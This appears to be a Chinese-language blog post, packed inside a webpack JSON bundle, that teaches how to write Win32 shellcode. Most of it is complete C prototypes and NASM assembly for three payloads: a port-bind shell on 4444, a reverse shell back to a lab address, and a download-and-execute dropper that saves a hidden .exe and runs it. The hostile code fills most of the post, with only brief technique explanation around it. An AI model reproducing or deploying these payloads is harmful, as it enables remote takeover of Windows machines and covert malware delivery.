webpackJsonp([104,194],{522:function(n,e){n.exports={rawContent:'\n \n# Win32 shellcode 管窥\n\n本文讨论下win32 shellcode。\n\n## 什么是shellcode？\n\n参见维基百科，想要翻译下结果一直没翻译。简单说下，就是一段测试漏洞的代码，可以控制计算机、干坏事等等等等。。。这段代码一般通过某种手段注入到有漏洞的程序内存空间中，运行并向攻击者提供一个控制台。\n\nshellcode通常但也不总是为了获取一个shell，但获取一个shell是获取计算机控制权的一流方式。\n\n## 如何编写shellcode？\n\n在windows中，不要指望像linux下那样用系统调用直接和内核交互，因为windows的系统调用一直在变化，也没有好的文档。\n\nwindows下把一些函数放到了dll链接库中，当程序运行时，这些dll库被载入到当前程序的内存空间中。调用这些函数只要知道这些函数的地址就行了。可是，每一个windows版本甚至一个补丁都会让这些地址变化。\n\n但kernel32一定会被加载到内存空间中去，kernel32.dll的地址在一个叫作PEB的块中却比较固定，于是人们就搜索PEB来找到kernel32.dll的地址。\n\n找到kernel32的地址之后，可以通过输出表(Export Table)搜索和解析之中所有的函数地址。尽管有些dll并不像kernel32一定会加载到程序内存空间中，却可以解析kernel32中的LoadLibraryA来载入它们，然后通过同样的解析函数方法来解析这些dll中的函数地址。\n\n由于shellcode的独特性，我们用汇编会获取更好的控制。但首先我会先用C语言来原型，搞清楚这些程序都干了什么。\n\n### 工具\n\n我用了以下一些工具：\n\n- wine lcc ： C编译器\n- wine immunity debugger： 调试器\n- shell ：工作环境和测试脚本\n- nasm ：汇编器\n- python： 我用来写一些小工具来比如帮助获取倒过来(因为x86中字节序的问题)函数哈希。\n\n当然还有写od一类的unix小工具，一个正常的linux发行版都会有这些东西的。\n\n### 工作流\n\n1. 找到kernel32的地址\n2. 解析出想要调用函数的地址\n3. 在堆上构建参数和调用函数\n\n虽然原理很简单，但是有些小细节：\n\n1. 尽量模块化重复代码即使用函数。函数尽量没有副作用，就是说尽量别把寄存器搞得乱七八糟。\n2. 尽量向前跳而不是向后跳，这是为了什么来着，对了为了减少shellcode中的NULL。你可以先不考虑这个问题，这比较复杂，这需要熟悉哪些等效的机器码没有bad characters。\n3. 记住jmp不能跳太远，也许你需要一些中转点。\n4. 你可以把要用到的常量或者参数直接放到shellcode中某处，或者就地在栈上构建，只要你方便索引就行。这主要看需求，比如你想集成的metasploit中，就最好把想更改的东西放到固定位置。\n\n## 示例\n\nTalk is cheap, show you the code... C代码是我自己写的，shellcode不一定是我自己写的。但即使是我自己写的也要仰仗于nologin上那篇著名的win32shellcode论文和projectshellcode上的示例。推荐有兴趣的人看看。\n\n### 示例1：端口绑定shellcode\n\n绑定一个端口并提供远程控制台。绑定到本机4444\n\nC原型：\n\n```c\n/*\n * =====================================================================================\n *\n *       Filename:  port_bind.c\n *\n *    Description:  port_bind in windows\n *\n *        Version:  1.0\n *        Created:  08/18/2013 05:01:19 PM\n *       Revision:  none\n *       Compiler:  lcc\n *\n *         Author:  reverland, \n *   Organization:  \n *\n * =====================================================================================\n */\n#include <windows.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <winsock2.h>\n\nint main(){\n  WSADATA wsaData;\n  WORD wVersionRequested;\n  struct sockaddr_in host;\n  struct sockaddr* addr;\n  SOCKET MySock, NSock;\n  wVersionRequested = MAKEWORD(2, 2);\n  int nret;\n\n  // FreeConsole\n  FreeConsole();\n  printf("size of WSADATA is %d\\n", sizeof(wsaData));\n  printf("size of wVersionRequested is %d\\n", sizeof(wVersionRequested));\n  // WSAStartup\n  if (WSAStartup(wVersionRequested, &wsaData) < 0)\n  {\n    printf("ws2 outof date!\\n");\n    WSACleanup();\n    exit(1);\n  }\n\n  // WSASocket\n  MySock = WSASocket(AF_INET, SOCK_STREAM, 0, 0, 0, 0);\n\n  host.sin_family = AF_INET;\n  host.sin_addr.s_addr = INADDR_ANY;\n  host.sin_port = htons(4444);\n\n  // bind\n  nret = bind(MySock, (struct sockaddr*)&host, sizeof(host));\n  printf("size of sockadr is %d\\n", sizeof(host));\n\n  if (nret == SOCKET_ERROR)\n    {\n      printf("Error on bind\\n");\n      WSACleanup();\n      exit(1);\n    }\n\n  // listen\n  nret = listen(MySock, 16);\n\n  if (nret == SOCKET_ERROR)\n    {\n      printf("Error on bind\\n");\n      WSACleanup();\n      exit(1);\n    }\n\n  // accept\n  addr = malloc(16);\n  int addrlen = 16;\n  NSock = accept(MySock, addr, &addrlen);\n  if (NSock == SOCKET_ERROR)\n  {\n    printf("Error on accept\\n");\n  }\n\n  // CreateProcess\n  char cmd[] = "cmd";\n  STARTUPINFO startupinfo;\n  printf("size of STARTUPINFO is %d\\n", sizeof(startupinfo));\n  PROCESS_INFORMATION processinformation;\n  printf("size of PROCESS_INFORMATION is %d\\n", sizeof(processinformation));\n  memset(&startupinfo, \'\\0\', sizeof(STARTUPINFO));\n  memset(&processinformation, \'\\0\', sizeof(PROCESS_INFORMATION));\n  startupinfo.cb = 0x44;\n  startupinfo.dwFlags = STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;\n  startupinfo.wShowWindow = SW_HIDE;\n  startupinfo.hStdInput = (HANDLE)NSock;\n  startupinfo.hStdOutput =(HANDLE)NSock;\n  startupinfo.hStdError = (HANDLE)NSock;\n  FreeConsole();\n  CreateProcess(NULL, cmd, NULL, NULL, 1, 0, NULL, NULL, &startupinfo, &processinformation);\n\n  // ExitProcess\n  ExitProcess(0);\n}\n```\n\nasm.c :\n\n```nasm\n; port_bind.asm\nBITS 32\n[SECTION .text]\nglobal _start\n_start:\n    jmp start_asm\n\n;DEFINE FUNCTIONS\n\n    find_kernel32:\n        push esi\n\txor eax, eax\n\tmov eax, [fs:eax+0x30] \t;PEB\n\tmov eax, [eax + 0x0c]\t;PEB->LoaderData\n\tmov esi, [eax + 0x1c]\t;PEB->LoaderData->InInitializationOrderModuleList\n\tlodsd\t\t\t;next entry the double linked list point to\n\tmov eax, [eax + 0x8]\t;imagebase of kernel32\n\tpop esi\n\tret\n\n\t;END FUNCTION: find_kernel32\n\n\t; FUNCTION: find_function\n    find_function:\t\t; find_functions(edx, eax)\n        pushad\n\tmov ebp, [esp+0x24]\t;edx(dll)\n\tmov eax, [ebp+0x3c]\t;Skip MS DOS header to PE header\n\tmov edx, [ebp+eax+0x78]\t;Export table is 0x78 byts from the start of the PE header\n\tadd edx, ebp\t\t;Absolute address\n\tmov ecx, [edx+0x18]\t;Number of functions\n\tmov ebx, [edx+0x20]\t; address of names(rva) table relative offset\n\tadd ebx, ebp\t\t; make the name talbe address absolute\n    find_function_loop:\n\tjecxz find_function_finished\n\tdec ecx\n\tmov esi, [ebx+ecx*4]\n\tadd esi, ebp\n    compute_hash:\n        xor edi, edi\n\txor eax, eax\n\tcld\n    compute_hash_again:\n        lodsb\n\ttest al, al\n\tjz compute_hash_finished\n\tror edi, 0xd\n\tadd edi, eax\n\tjmp compute_hash_again\n    compute_hash_finished:\n    find_funtion_compare:\n        cmp edi, [esp+0x28]\n\tjnz find_function_loop\n\tmov ebx, [edx+0x24]\t; Exetract ordinals table relative offset and store it in ebx\n\tadd ebx, ebp\n\tmov cx, [ebx + 2*ecx]\t; Extract the current symbos ordinal number from the ordinal table; Ordinals are 2 bytes in size\n\tmov ebx, [edx+0x1c]\t;Extract the address table relative offset and store it in ebx\n\tadd ebx, ebp\t\t; make the address table address absolute\n\tmov eax, [ebx + 4*ecx]\t; extract the realtve function offset from its ordinal and store it in eax\n\tadd eax, ebp\n\tmov [esp+0x1c], eax\t; overwrite eax\n    find_function_finished:\n\tpopad\n\tret\n\n\t; END FUNCTION: find_function\n\t; FUNCTION: resolve_symbols_for_dll\n    resolve_symbols_for_dll:\n\t; about to load current hash into eax(pointed by esi)\n\tlodsd\n\tpush eax\n\tpush edx\n\tcall find_function\n\tmov [edi], eax\n\tadd esp, 0x08\n\tadd edi, 0x04\n\tcmp esi, ecx\n\tjne resolve_symbols_for_dll\n    resolve_symbols_for_dll_finished:\n        ret\n\n\t; END FUNCTION: resolve_symbols_for_dll\n\n;END FUNCTIONS\n\n    locate_kernel32_hashes:\n        call locate_kernel32_hashes_return\n\t; BIG ENDIAN\n\t; LoadLibraryA\n\tdb 0x8e, 0x4e, 0x0e, 0xec\n\t; CreateProcessA\n\tdb 0x72, 0xfe, 0xb3, 0x16\n\t; ExitProcess\n\tdb 0x7e, 0xd8, 0xe2, 0x73\n    ;locate ws2_32_hashes\n        ; WSASocketA\n\tdb 0xd9, 0x09, 0xf5, 0xad\n\t; bind\n\tdb 0xa4, 0x1a, 0x70, 0xc7\n\t; listen\n\tdb 0xa4, 0xad, 0x2e, 0xe9\n\t; accept\n\tdb 0xe5, 0x49, 0x86, 0x49\n\t; WSAStartup\n\tdb 0xcb, 0xed, 0xfc, 0x3b\n    ; END DEFINE CONSTANTS\n\n    start_asm:\n       sub esp, 0x68 ; !!随便给的\n       mov ebp, esp\n       call find_kernel32\n       mov edx, eax\n       ; resolve kernel32 symbols\n       jmp short locate_kernel32_hashes\n    locate_kernel32_hashes_return:\n       pop esi\n       lea edi,[ebp+0x00] \n       mov ecx, esi\n\n\t\n        \n\n       add ecx, 0x0c ; length of kernel32 list\n       call resolve_symbols_for_dll\n\n       ; resolve ws2_32 symbols\n       add ecx, 0x14\n       xor eax, eax\n       mov ax, 0x3233\n       push eax\n       push dword 0x5f327377\n       mov ebx, esp ; point to "ws2_32"\n\n       push ecx\n       push edx\n       push ebx\n       call [ebp+0x0]\n\n       pop edx ; kernel32 address\n       pop ecx ; counter\n       mov edx, eax ; ws2_32.dll address\n       call resolve_symbols_for_dll\n\n   initialize_cmd:\n       mov eax, 0x646d6301\n       sar eax, 0x08\n       push eax\n       mov [ebp+0x30], esp\n\n   WSAStartup:\n       xor edx, edx\n       mov edx, 0x190\n       sub esp, edx\n       ; initialize winsock\n       push esp\n       push 0x02\n       call [ebp+0x1c]\n       add esp, 0x190\n\n   create_socket:\n       xor eax, eax\n       push eax\n       push eax\n       push eax\n       push eax\n       inc eax\n       push eax\n       inc eax\n       push eax\n       call [ebp+0x0c]\n       mov esi, eax\n\n   bind:\n       xor eax, eax\n       xor ebx, ebx\n       push eax\n       push eax\n       push eax\n       mov eax, 0x5c110102\n       dec ah\n       push eax\n       mov eax, esp\n       mov bl, 0x10\n       push ebx\n       push eax\n       push esi\n       call [ebp+0x10]\n\n   listen:\n       push ebx\n       push esi\n       call [ebp+0x14]\n\n   accept:\n       push ebx\n       mov edx, esp\n       sub esp, ebx\n       mov ecx, esp\n       push edx\n       push ecx\n       push esi\n       call [ebp+0x18]\n       mov esi, eax\n\n   initialize_process:\n       xor ecx, ecx\n       mov cl, 0x54\n       sub esp,ecx\n       mov edi, esp\n       push edi\n   zero_structs:\n       xor eax, eax\n       rep stosb\n       pop edi\n   initialize_structs:\n       mov byte [edi], 0x44\n       inc byte [edi+0x2d] ; STARTF_USESTDHANDLES \n       push edi\n       mov eax, esi\n       lea edi, [edi+0x38]\n       stosd\n       stosd\n       stosd\n       pop edi\n   execute_process:\n       xor eax, eax\n       lea esi, [edi+0x44]\n       push esi\n       push edi\n       push eax\n       push eax\n       push eax\n       inc eax\n       push eax\n       dec eax\n       push eax\n       push eax\n       push dword [ebp+0x30] ; p->"cmd"\n       push eax\n       call [ebp+0x04]\n   exit_process:\n       call [ebp+0x08]\n```\n\n### 示例2：反弹shellcode\n\n反向连接shellcode，提供远程控制台。反向到192.168.56.102, 端口4444\n\nC 示例：\n\n```c\n/*\n * =====================================================================================\n *\n *       Filename:  connectback.c\n *\n *    Description:  Connect back example\n *\n *        Version:  1.0\n *        Created:  08/23/2013 04:49:55 PM\n *       Revision:  none\n *       Compiler:  gcc\n *\n *         Author:  Reverland, \n *   Organization:  \n *\n * =====================================================================================\n */\n#include <stdlib.h>\n#include <stdio.h>\n#include <unistd.h>\n#include <string.h>\n#include <winsock2.h>\n#include <wininet.h>\n\n\nint main(){\n  WSADATA wsaData;\n  WORD wVersionRequested;\n  struct sockaddr_in host, client;\n  struct sockaddr* addr;\n  SOCKET MySock, NSock;\n  wVersionRequested = MAKEWORD(2, 2);\n  int nret;\n  char ip[] = "127.0.0.1";\n\n  // FreeConsole\n  FreeConsole();\n  printf("size of WSADATA is %d\\n", sizeof(wsaData));\n  printf("size of wVersionRequested is %d\\n", sizeof(wVersionRequested));\n  // WSAStartup\n  if (WSAStartup(wVersionRequested, &wsaData) < 0)\n  {\n    printf("ws2 outof date!\\n");\n    WSACleanup();\n    exit(1);\n  }\n\n  // WSASocket\n  MySock = WSASocket(AF_INET, SOCK_STREAM, 0, 0, 0, 0);\n\n  client.sin_family = AF_INET;\n  client.sin_addr.s_addr = inet_addr(ip);\n  client.sin_port = htons(4444);\n\n  // bind\n  nret = connect(MySock, (struct sockaddr*)&client, sizeof(client));\n  printf("size of sockadr is %d\\n", sizeof(host));\n\n  if (nret == SOCKET_ERROR)\n    {\n      printf("Error on connect\\n");\n      WSACleanup();\n      exit(1);\n    }\n\n  // CreateProcess\n  char cmd[] = "cmd";\n  STARTUPINFO startupinfo;\n  printf("size of STARTUPINFO is %d\\n", sizeof(startupinfo));\n  PROCESS_INFORMATION processinformation;\n  printf("size of PROCESS_INFORMATION is %d\\n", sizeof(processinformation));\n  memset(&startupinfo, \'\\0\', sizeof(STARTUPINFO));\n  memset(&processinformation, \'\\0\', sizeof(PROCESS_INFORMATION));\n  startupinfo.cb = 0x44;\n  startupinfo.dwFlags = STARTF_USESTDHANDLES;\n  startupinfo.hStdInput = (HANDLE)MySock;\n  startupinfo.hStdOutput =(HANDLE)MySock;\n  startupinfo.hStdError = (HANDLE)MySock;\n  FreeConsole();\n  CreateProcess(NULL, cmd, NULL, NULL, 1, 0, NULL, NULL, &startupinfo, &processinformation);\n\n  // ExitProcess\n  ExitProcess(0);\n}\n```\n\nasm：\n\n```nasm\n[SECTION .text]\nBITS 32\nglobal _start\n_start:\n    jmp start_asm\n\n;DEFINE FUNCTIONS\n\n    find_kernel32:\n        push esi\n\txor eax, eax\n\tmov eax, [fs:eax+0x30] \t;PEB\n\tmov eax, [eax + 0x0c]\t;PEB->LoaderData\n\tmov esi, [eax + 0x1c]\t;PEB->LoaderData->InInitializationOrderModuleList\n\tlodsd\t\t\t;next entry the double linked list point to\n\tmov eax, [eax + 0x8]\t;imagebase of kernel32\n\tpop esi\n\tret\n\n\t;END FUNCTION: find_kernel32\n\n\t; FUNCTION: find_function\n    find_function:\t\t; find_functions(edx, eax)\n        pushad\n\tmov ebp, [esp+0x24]\t;edx(dll)\n\tmov eax, [ebp+0x3c]\t;Skip MS DOS header to PE header\n\tmov edx, [ebp+eax+0x78]\t;Export table is 0x78 byts from the start of the PE header\n\tadd edx, ebp\t\t;Absolute address\n\tmov ecx, [edx+0x18]\t;Number of functions\n\tmov ebx, [edx+0x20]\t; address of names(rva) table relative offset\n\tadd ebx, ebp\t\t; make the name talbe address absolute\n    find_function_loop:\n\tjecxz find_function_finished\n\tdec ecx\n\tmov esi, [ebx+ecx*4]\n\tadd esi, ebp\n    compute_hash:\n        xor edi, edi\n\txor eax, eax\n\tcld\n    compute_hash_again:\n        lodsb\n\ttest al, al\n\tjz compute_hash_finished\n\tror edi, 0xd\n\tadd edi, eax\n\tjmp compute_hash_again\n    compute_hash_finished:\n    find_funtion_compare:\n        cmp edi, [esp+0x28]\n\tjnz find_function_loop\n\tmov ebx, [edx+0x24]\t; Exetract ordinals table relative offset and store it in ebx\n\tadd ebx, ebp\n\tmov cx, [ebx + 2*ecx]\t; Extract the current symbos ordinal number from the ordinal table; Ordinals are 2 bytes in size\n\tmov ebx, [edx+0x1c]\t;Extract the address table relative offset and store it in ebx\n\tadd ebx, ebp\t\t; make the address table address absolute\n\tmov eax, [ebx + 4*ecx]\t; extract the realtve function offset from its ordinal and store it in eax\n\tadd eax, ebp\n\tmov [esp+0x1c], eax\t; overwrite eax\n    find_function_finished:\n\tpopad\n\tret\n\n\t; END FUNCTION: find_function\n\t; FUNCTION: resolve_symbols_for_dll\n    resolve_symbols_for_dll:\n\t; about to load current hash into eax(pointed by esi)\n\tlodsd\n\tpush eax\n\tpush edx\n\tcall find_function\n\tmov [edi], eax\n\tadd esp, 0x08\n\tadd edi, 0x04\n\tcmp esi, ecx\n\tjne resolve_symbols_for_dll\n    resolve_symbols_for_dll_finished:\n        ret\n\n\t; END FUNCTION: resolve_symbols_for_dll\n\n;END FUNCTIONS\n\n    locate_kernel32_hashes:\n        call locate_kernel32_hashes_return\n        ;LoadLibraryA\n        db 0x8e\n        db 0x4e\n        db 0x0e\n        db 0xec\n        ;CreateProcessA\n        db 0x72\n        db 0xfe\n        db 0xb3\n        db 0x16\n        ;ExitProcess\n        db 0x7e\n        db 0xd8\n        db 0xe2\n        db 0x73\n        ;locate_ws2_32_hashes:\n        ;WSASocketA\n        db 0xd9\n        db 0x09\n        db 0xf5\n        db 0xad\n        ;connect\n        db 0xec\n        db 0xf9\n        db 0xaa\n        db 0x60\n        ;WSAStartup\n        db 0xcb\n        db 0xed\n        db 0xfc\n        db 0x3b\n        ;END DEFINE CONSTANTS\n\n    start_asm:\n        sub esp, 0x68\n\tmov ebp, esp\n\tcall find_kernel32\n\tmov edx, eax\n        ; resolve kernel32 symbols\n        jmp short locate_kernel32_hashes\n    locate_kernel32_hashes_return:\n        pop esi\n        lea edi,[ebp+0x00] \n        mov ecx, esi\n        add ecx, 0x0c ; length of kernel32 list\n        call resolve_symbols_for_dll\n\n        ; resolve ws2_32 symbols\n        add ecx, 0x0c\n\t; create ws2_32 string\n        xor eax, eax\n        mov ax, 0x3233\n        push eax\n        push dword 0x5f327377\n        mov ebx, esp ; point to "ws2_32"\n\n\tpush ecx\n        push edx\n        push ebx\n        call [ebp+0x0] ; LoadLibraryA("ws2_32")\n\n        pop edx ; kernel32 address\n        pop ecx ; counter\n        mov edx, eax ; ws2_32.dll address\n        call resolve_symbols_for_dll\n\n        initialize_cmd:\n            mov eax, 0x646d6301\n            sar eax, 0x08\n            push eax\n            mov [ebp+0x24], esp\n\t\n        WSAStartup:\n            xor edx, edx\n            mov edx, 0x190\n            sub esp, edx\n            ; initialize winsock\n            push esp\n            push 0x02\n            call [ebp+0x14]\n            add esp, 0x190\n\n   create_socket:\n       xor eax, eax\n       push eax\n       push eax\n       push eax\n       push eax\n       inc eax\n       push eax\n       inc eax\n       push eax\n       call [ebp+0x0c]\n       mov esi, eax\n\n    do_connect:\n        push 0x0100007f\n\tmov eax, 0x5c110102\n\tdec ah\n\tpush eax\n\tmov ebx, esp\n\txor eax, eax\n\tmov al, 0x10\n\tpush eax\n\tpush ebx\n\tpush esi\n\tcall [ebp+0x10]\n\n   initialize_process:\n       xor ecx, ecx\n       mov cl, 0x54\n       sub esp,ecx\n       mov edi, esp\n       push edi\n   zero_structs:\n       xor eax, eax\n       rep stosb\n       pop edi\n   initialize_structs:\n       mov byte [edi], 0x44\n       inc byte [edi+0x2d] ; STARTF_USESTDHANDLES \n       push edi\n       mov eax, esi\n       lea edi, [edi+0x38]\n       stosd\n       stosd\n       stosd\n       pop edi\n   execute_process:\n       xor eax, eax\n       lea esi, [edi+0x44]\n       push esi\n       push edi\n       push eax\n       push eax\n       push eax\n       inc eax\n       push eax\n       dec eax\n       push eax\n       push eax\n       push dword [ebp+0x24] ; p->"cmd"\n       push eax\n       call [ebp+0x04]\n   exit_process:\n       call [ebp+0x08]\n```\n\n### 下载并运行shellcode\n\nC原型：\n\n```c\n/*\n * =====================================================================================\n *\n *       Filename:  download_execute.c\n *\n *    Description:  Download and execute shellcode\n *\n *        Version:  1.0\n *        Created:  08/22/2013 03:53:36 PM\n *       Revision:  none\n *       Compiler:  gcc\n *\n *         Author:  Reverland, \n *   Organization:  \n *\n * =====================================================================================\n */\n#include <stdlib.h>\n#include <stdio.h>\n#include <windows.h>\n#include <wininet.h>\n\nint main(){\n  HINTERNET nethandle;\n\n  // allocate an internet handle\n  printf("Allocate an internet handle\\n");\n  nethandle = InternetOpen(NULL, 0, NULL, NULL, 0);\n  if (nethandle == NULL)\n  {\n    printf("Error on InternetOpen\\n");\n    exit(0);\n  }\n\n  // allocate a resource handle\n  printf("Allocate a resource handle\\n");\n  HINTERNET reshandle;\n  char url[] = "http://localhost:4000/calc.exe";\n  reshandle = InternetOpenUrl(nethandle, url, NULL, 0, 0, 0);\n  if (reshandle == NULL)\n  {\n    printf("Error on InternetOpenUrl\\n");\n    exit(0);\n  }\n\n  // Create the local executable file\n  printf("Create the local executable file\\n");\n  HANDLE filehandle;\n  char filename[] = "something.exe";\n  filehandle = CreateFile(filename, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL|FILE_ATTRIBUTE_HIDDEN, NULL);\n  if (filehandle == 0)\n  {\n    printf("Error on CreateFile\\n");\n    exit(0);\n  }\n\n  \n  // Download the executable\n  printf("download the executable\\n");\n  DWORD NumberOfBytesRead=0;\n  DWORD NumberOfBytesWritten=0;\n  BOOL nret;\n  while (1==1){\n    void *Buffer = malloc(260);\n    nret = InternetReadFile(reshandle, Buffer, 260, &NumberOfBytesRead);\n    printf("InternetReadFile\\n");\n    printf("read %d bytes\\n", (int)NumberOfBytesRead);\n    printf("%s\\n", (char *)Buffer);\n    if (NumberOfBytesRead == 0)\n      break;\n    printf("WriteFile\\n");\n    nret = WriteFile(filehandle, Buffer, NumberOfBytesRead, &NumberOfBytesWritten, NULL);\n    printf("write %d bytes\\n", (int)NumberOfBytesWritten);\n    if (nret == 0)\n    {\n      printf("Error on Writefile\\n");\n      exit(0);\n    }\n    free(Buffer);\n  }\n  printf("Close handle\\n");\n  CloseHandle(filehandle);\n\n  // Create Process\n  printf("Create Process\\n");\n  STARTUPINFO startupinfo;\n  // printf("size of STARTUPINFO is %d\\n", sizeof(startupinfo));\n  PROCESS_INFORMATION processinformation;\n  // printf("size of PROCESS_INFORMATION is %d\\n", sizeof(processinformation));\n  memset(&startupinfo, \'\\0\', sizeof(STARTUPINFO));\n  memset(&processinformation, \'\\0\', sizeof(PROCESS_INFORMATION));\n  startupinfo.cb = 0x44;\n  CreateProcess(NULL, filename, NULL, NULL, 0, 0, NULL, NULL, &startupinfo, &processinformation);\n\n  ExitProcess(0);\n}\n```\n\nasm：\n\n```nasm\n; port_bind.asm\nBITS 32\n[SECTION .text]\nglobal _start\n_start:\n    jmp start_asm\n\n;DEFINE FUNCTIONS\n\n    find_kernel32:\n        push esi\n\txor eax, eax\n\tmov eax, [fs:eax+0x30] \t;PEB\n\tmov eax, [eax + 0x0c]\t;PEB->LoaderData\n\tmov esi, [eax + 0x1c]\t;PEB->LoaderData->InInitializationOrderModuleList\n\tlodsd\t\t\t;next entry the double linked list point to\n\tmov eax, [eax + 0x8]\t;imagebase of kernel32\n\tpop esi\n\tret\n\n\t;END FUNCTION: find_kernel32\n\n\t; FUNCTION: find_function\n    find_function:\t\t; find_functions(edx, eax)\n        pushad\n\tmov ebp, [esp+0x24]\t;edx(dll)\n\tmov eax, [ebp+0x3c]\t;Skip MS DOS header to PE header\n\tmov edx, [ebp+eax+0x78]\t;Export table is 0x78 byts from the start of the PE header\n\tadd edx, ebp\t\t;Absolute address\n\tmov ecx, [edx+0x18]\t;Number of functions\n\tmov ebx, [edx+0x20]\t; address of names(rva) table relative offset\n\tadd ebx, ebp\t\t; make the name talbe address absolute\n    find_function_loop:\n\tjecxz find_function_finished\n\tdec ecx\n\tmov esi, [ebx+ecx*4]\n\tadd esi, ebp\n    compute_hash:\n        xor edi, edi\n\txor eax, eax\n\tcld\n    compute_hash_again:\n        lodsb\n\ttest al, al\n\tjz compute_hash_finished\n\tror edi, 0xd\n\tadd edi, eax\n\tjmp compute_hash_again\n    compute_hash_finished:\n    find_funtion_compare:\n        cmp edi, [esp+0x28]\n\tjnz find_function_loop\n\tmov ebx, [edx+0x24]\t; Exetract ordinals table relative offset and store it in ebx\n\tadd ebx, ebp\n\tmov cx, [ebx + 2*ecx]\t; Extract the current symbos ordinal number from the ordinal table; Ordinals are 2 bytes in size\n\tmov ebx, [edx+0x1c]\t;Extract the address table relative offset and store it in ebx\n\tadd ebx, ebp\t\t; make the address table address absolute\n\tmov eax, [ebx + 4*ecx]\t; extract the realtve function offset from its ordinal and store it in eax\n\tadd eax, ebp\n\tmov [esp+0x1c], eax\t; overwrite eax\n    find_function_finished:\n\tpopad\n\tret\n\n\t; END FUNCTION: find_function\n\t; FUNCTION: resolve_symbols_for_dll\n    resolve_symbols_for_dll:\n\t; about to load current hash into eax(pointed by esi)\n\tlodsd\n\tpush eax\n\tpush edx\n\tcall find_function\n\tmov [edi], eax\n\tadd esp, 0x08\n\tadd edi, 0x04\n\tcmp esi, ecx\n\tjne resolve_symbols_for_dll\n    resolve_symbols_for_dll_finished:\n        ret\n\n\t; END FUNCTION: resolve_symbols_for_dll\n\n;END FUNCTIONS\n\n    locate_kernel32_hashes:\n        call locate_kernel32_hashes_return\n\t; BIG ENDIAN\n\t; LoadLibraryA---ebp\n\tdb 0x8e, 0x4e, 0x0e, 0xec\n\t; CreateFile---ebp+4\n\tdb 0xa5, 0x17, 0x0, 0x7c\n\t; WriteFile---ebp+0x8\n        db 0x1f, 0x79, 0xa, 0xe8\n        ; CloseHandle---ebp+0xc\n        db 0xfb, 0x97, 0xfd, 0xf\n\t; CreateProcessA---ebp+0x10\n\tdb 0x72, 0xfe, 0xb3, 0x16\n\t; ExitProcess---ebp+0x14\n\tdb 0x7e, 0xd8, 0xe2, 0x73\n    ; Wininet.dll function hashes\n        ; InternetOpenA---ebp+0x18\n        db 0x29, 0x44, 0xe8, 0x57\n\t; InternetOpenUrlA---ebp+0x1c\n        db 0x49, 0xed, 0xf, 0x7e\n        ; InternetReadFile---ebp+0x20\n        db 0x8b, 0x4b, 0xe3, 0x5f\n\n    ; DEFINE Constants END\n        \n    start_asm:\n        sub esp, 0x88\n\tmov ebp, esp\n\tcall find_kernel32\n\tmov edx, eax\n\t; resolve kernel32 symbols\n\tjmp short locate_kernel32_hashes\n    locate_kernel32_hashes_return:\n        pop esi\n\tlea edi, [ebp+0x00]\n\tmov ecx, esi\n\tadd ecx, 0x18 \t; length of kernel32 list\n\tcall resolve_symbols_for_dll\n\n\t; resolve wininet symbols\n\tadd ecx, 0xc\n\t; xor eax, eax\n\tmov eax, 0x74656e01\n\tsar eax, 0x08\n\tpush eax\t; net\n\tpush 0x696e6977\t; wini\n\tmov ebx, esp\n\tpush ecx\t; preserve ecx, LoadLibraryA 破坏ecx和edx?\n\tpush edx\t; preserve edx\n\tpush ebx\n\tcall [ebp+0x0]\n\tpop edx\n\tpop ecx\n\tmov edx, eax\t; 之前保护edx干么...?\n\tcall resolve_symbols_for_dll\n    internet_open:\n        xor eax, eax\n\tpush eax\n\tpush eax\n\tpush eax\n\tpush eax\n\tpush eax\n\tcall [ebp+0x18]\n\tmov [ebp+0x24], eax ; nethandle\n    internet_open_url:\n        xor eax, eax\n\tmov ax, 0x6578\n\tpush eax\n\tpush 0x652e636c \t; calc.exe\n\tpush 0x61632f30\n\tpush 0x3030383a\n\tpush 0x74736f68\n\tpush 0x6c61636f\n\tpush 0x6c2f2f3a\n\tpush 0x70747468 ; http://localhost:8000/calc.exe\n\tmov ebx, esp\n\txor eax, eax\n\tpush eax\n\tpush eax\n\tpush eax\n\tpush eax\n\tpush ebx\n\tpush dword [ebp+0x24]\t\t;nethandle\n\tcall [ebp+0x1c]\n\tmov [ebp+0x28], eax\t; reshandle\n    \n    create_file:\n        xor eax, eax\n\tmov al, 0x65\n\tpush eax\n\tpush 0x78652e67\n\tpush 0x6e696874\n\tpush 0x656d6f73 \t; something.exe\n\tmov [ebp+0x2c], esp\t; filename->something\n\txor eax, eax\n\tpush eax\n\tmov al, 0x82\t\t; FILE_ATTRIBUTE_NORMAL|FILE_ATTRIBUTE_HIDDEN\n\tpush eax\n\tmov al, 0x02\n\tpush eax\t\t; CREATE_ALWAYS\n\txor al, al\n\tpush eax\n\tpush eax\n\tmov al, 0x40\n\tsal eax, 0x18\t\t; GENERIC_ALL\n\tpush eax\n\tpush dword [ebp+0x2c]\n\tcall [ebp+0x4]\n\tmov [ebp+0x30], eax\t; filehandle\n\n    download_begin:\n        xor eax, eax\n\tmov ax, 0x010c\t; esi->DWORD numberofbytesread + 260 buffer\n\tsub esp, eax\n\tmov esi, esp\n    download_loop:\n        push esi\t; \n\tmov ax, 0x0104\n\tpush eax\n\tlea eax, [esi+4]\n\tpush eax\n\tpush dword [ebp+0x28]\t\t; reshandle\n\tcall [ebp+0x20]\n\tmov eax, [esi]\t\t; NumbeOfBytesRead\n\ttest eax, eax\n\tjz download_finished\n    download_write_file:\n        xor eax, eax\n\tpush eax\t\t\n\tpush esi\n\tpush dword [esi]\n\tlea eax, [esi+0x04]\n\tpush eax\n\tpush dword [ebp+0x30]\n\tcall [ebp+0x8]\n\tjmp download_loop\n    download_finished:\n        push dword [ebp+0x30]\n\tcall [ebp+0xc]\n\txor eax, eax\n\tmov ax, 0x0104 \t; restore stack\n\t; CreateProcess\n    initialize_process:\n\tadd esp, eax\n\txor ecx, ecx\n\tmov cl, 0x54\n\tsub esp, ecx\n\tmov edi, esp\n    zero_structs:\n        xor eax, eax\n\trep stosb\n    initialize_structs:\n        mov edi, esp\n\tmov byte [edi], 0x44\t; !!!!!cb\n    execute_process:\n        lea esi, [edi+0x44]\t\t; esi->process_information\n\tpush esi\n\tpush edi\n\tpush eax\n\tpush eax\n\tpush eax\n\tpush eax\n\tpush eax\n\tpush eax\n\tpush dword [ebp+0x2c]\t\t; ->"something"\n\tpush eax\n\tcall [ebp+0x10]\n    exit_process:\n        call [ebp+0x14]\n```\n\n### 分阶段shellcode\n\n第一阶段建立连接，并读取shellcode，然后指向执行。\n\n待续。。。\n',metaData:{layout:"post",title:"Win32 